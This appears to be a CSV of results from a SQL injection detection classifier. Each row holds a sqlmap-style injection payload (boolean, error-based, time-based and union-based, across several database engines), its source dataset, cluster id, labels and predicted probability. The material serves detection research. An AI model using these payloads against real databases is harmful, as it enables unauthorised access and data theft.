text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
"1""  )  )   and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  ""auyv"" = ""auyv",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.999993085861206,1
"1"" )  as ymto where 3453 = 3453",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1646,1,1,0.9999932050704956,1
1'  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( 'jzpb' = 'jzpb,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.9999929666519165,1
"-4155'  )  )   )  union all select 1775,1775,1775,1775,1775,1775,1775--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1657,1,1,0.9999932050704956,1
"-4653' or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,292,1,1,0.9999932050704956,1
1 )  rlike sleep ( 5 )  and  ( 5724 = 5724,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1668,1,1,0.999993085861206,1
1  )  )   or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (  3069 = 3069,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,229,1,1,0.9999932050704956,1
"1 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) # couj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
select case when 8867 = 7630 then 1 else null end--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1682,1,1,0.9999915361404419,1
"-3361 where 1335 = 1335 or elt ( 5891 = 5092,5092 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1686,1,1,0.9999926090240479,1
"-5073"" )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( ""kbab"" like ""kbab",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
"1  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  5776 = 5776",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
1 )  as ratg where 3033 = 3033 union all select null--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1702,1,1,0.9999929666519165,1
-2756' where 6156 = 6156 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.999993085861206,1
"1, ( select  ( case when  ( 9644 = 9644 )  then dbms_pipe.receive_message ( chr ( 75 ) ||chr ( 78 ) ||chr ( 104 ) ||chr ( 98 ) ,5 )  else 1/ ( select 0 from dual )  end )  from dual )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1709,1,1,0.9999932050704956,1
1' )  as nexa where 6740 = 6740,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1720,1,1,0.9999932050704956,1
"-9922'  )  )   union all select 2193,2193,2193--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1735,1,1,0.9999932050704956,1
"1 where 2751 = 2751 union all select null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1737,1,1,0.9999926090240479,1
1 )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 3530 = 3530,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.9999929666519165,1
"-1917"" )  or 8571 = 8571--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1742,1,1,0.999993085861206,1
1'  )  )   or sleep ( 5 )  and   (  (  'taaj' = 'taaj,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1761,1,1,0.9999932050704956,1
"1', ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4250 = 4250 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.9999929666519165,1
1 )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 9932 = 9932,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
"1""  )  )   as cduw where 4495 = 4495",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1769,1,1,0.999993085861206,1
"select * from generate_series ( 5846,5846,case when  ( 5846 = 5227 )  then 1 else 0 end )  limit 1--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1775,1,1,0.999993085861206,1
1 )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( 7015 = 7015,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,229,1,1,0.999993085861206,1
1 where 8214 = 8214 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.999993085861206,1
select  ( case when  ( 5322 = 6200 )  then 5322 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1786,1,1,0.999993085861206,1
1' )  as scnn where 9274 = 9274,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1796,1,1,0.9999932050704956,1
1'|| ( select 'byxb' where 8351 = 8351 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric  )  )  ||',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
-5020%' )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
"-6407' )  or elt ( 1631 = 4946,4946 )  and  ( 'jpnz' = 'jpnz",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1806,1,1,0.9999932050704956,1
"1""  )  )   or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  ""nobt"" = ""nobt",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
"-9854%""  )  )   )  or 6455 = 3652",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1817,1,1,0.9999932050704956,1
"-5493""  )  )   union all select 8001,8001--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1821,1,1,0.999993085861206,1
"1"" and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and ""ardk"" like ""ardk",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
"1'  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  'kqip' like 'kqip",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
-6766'  )  )   )  or 3038 = 3038,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1833,1,1,0.9999932050704956,1
1'+ ( select 'vjoj' where 5348 = 5348,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1847,1,1,0.9999929666519165,1
1  )  )   as vryv where 5600 = 5600,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1853,1,1,0.9999929666519165,1
1'  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  'yhku' like 'yhku,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
"-8128""  )  )   as ovjz where 7375 = 7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1867,1,1,0.9999932050704956,1
1'  )  )   as sjzf where 9997 = 9997 and 4193 = 5408,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1871,1,1,0.9999932050704956,1
1 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  # awpq,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,229,1,1,0.999993085861206,1
-8112'  )  )   )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 'xopg' = 'xopg,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
"1""  )  )   as oxrr where 6141 = 6141 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1880,1,1,0.9999933242797852,1
"1 where 8045 = 8045 union all select null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1891,1,1,0.9999926090240479,1
-9024 )  where 1686 = 1686 or 3069 = 8213--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1904,1,1,0.9999929666519165,1
"-4543"" )  or 3038 = 3038",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1908,1,1,0.999993085861206,1
"1'  )  )   )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( 'crus' = 'crus",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
-7497' )  as kjzt where 3758 = 3758 or 4794 = 9499--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1919,1,1,0.999993085861206,1
1'  )  )   )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (   ( 'mzqi' = 'mzqi,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,229,1,1,0.9999932050704956,1
"1"" )  where 3390 = 3390",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1925,1,1,0.999993085861206,1
1' and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and 'fbzo' like 'fbzo,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.9999929666519165,1
waitfor delay '0:0:5' and  ( 'eaxu' = 'eaxu,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1943,1,1,0.999992847442627,1
1'  )  )   rlike  ( select  ( case when  ( 8489 = 8820 )  then 1 else 0x28 end  )  )   and   (  (  'fbjf' = 'fbjf,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1946,1,1,0.9999932050704956,1
"1 where 8390 = 8390 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1949,1,1,0.9999932050704956,1
"1""  )  )   as drss where 2077 = 2077 and 7533 = 7533--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1967,1,1,0.9999933242797852,1
1'  )  )   )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (   ( 'odsl' like 'odsl,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,229,1,1,0.9999932050704956,1
"1%""  )  )   and 8316 = 6410#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1980,1,1,0.999993085861206,1
1'+ ( select ukwc where 3008 = 3008 or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1985,1,1,0.9999932050704956,1
1 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) -- jdia,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
1'|| ( select 'homm' where 4937 = 4937 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2001,1,1,0.9999932050704956,1
-7746'  )  )   )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( 'itxy' like 'itxy,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.999993085861206,1
select  ( case when  ( 1898 = 4705 )  then 1898 else 1/ ( select 0 )  end ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2012,1,1,0.999993085861206,1
1'|| ( select 'agng' from dual where 3337 = 3337 rlike sleep ( 5  )  )  ||',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2017,1,1,0.9999932050704956,1
"-3420 where 9681 = 9681 or make_set ( 2438 = 1977,1977 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2018,1,1,0.9999926090240479,1
-5500' )  order by 1--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2027,1,1,0.9999929666519165,1
select  ( case when  ( 8362 = 7572 )  then 8362 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2036,1,1,0.999993085861206,1
-2181' )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 'wyez' = 'wyez,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
"1"" where 3329 = 3329 or sleep ( 5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2047,1,1,0.9999929666519165,1
"1"" )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( ""ypoj"" = ""ypoj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999933242797852,1
"1"" where 6023 = 6023",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2059,1,1,0.9999927282333374,1
"1"" and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and ""mbas"" = ""mbas",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
"1%"" )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
select sleep ( 5 )  and   (  (  8679 = 8679,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2073,1,1,0.999992847442627,1
-4058 )  union all select 9184--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2081,1,1,0.999992847442627,1
1 )  as nbno where 9816 = 9816 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.999993085861206,1
"-4419%""  )  )   or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,292,1,1,0.9999932050704956,1
1' where 9583 = 9583 and 5319 = 7670#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2094,1,1,0.999992847442627,1
1' )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 'izyf' = 'izyf,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.9999929666519165,1
"1'|| ( select 'wgte' from dual where 6316 = 6316 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )    )  )  ||'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
1 where 7299 = 7299 rlike sleep ( 5 ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2099,1,1,0.9999926090240479,1
-1190' or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and 'yxry' like 'yxry,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.9999929666519165,1
1'  )  )   as rxxd where 5049 = 5049,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2120,1,1,0.999993085861206,1
"1'+ ( select sshu where 3442 = 3442 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )    )  )  +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
"-2216  )  )   as hxmq where 5677 = 5677 union all select 5677,5677--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2137,1,1,0.999993085861206,1
1'  )  )   waitfor delay '0:0:5' and   (  (  'amnf' like 'amnf,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2147,1,1,0.9999932050704956,1
1 where 3357 = 3357 and  ( 9492 = 4334 ) *4334--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2150,1,1,0.9999927282333374,1
"1"" or elt ( 6272 = 6272,sleep ( 5  )  )   and ""hvic"" like ""hvic",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2158,1,1,0.9999932050704956,1
"-2605%'  )  )   )  union all select 4738,4738#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2169,1,1,0.9999932050704956,1
"-1964' )  as ihsp where 6379 = 6379 or elt ( 6945 = 6165,6165 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2181,1,1,0.9999933242797852,1
"-6659' )  where 1256 = 1256 union all select 1256,1256--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2191,1,1,0.999993085861206,1
1  )  )   as kccx where 7547 = 7547 union all select null--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2203,1,1,0.9999929666519165,1
1'  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 'cbnc' like 'cbnc,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.999993085861206,1
1' )  where 9516 = 9516,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2213,1,1,0.999993085861206,1
1  )  )   as dgso where 4654 = 4654 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
1'+ ( select oljg where 2006 = 2006 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual  )  )  +',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.9999929666519165,1
1' )  as jztg where 1222 = 1222 or sleep ( 5 ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2220,1,1,0.9999932050704956,1
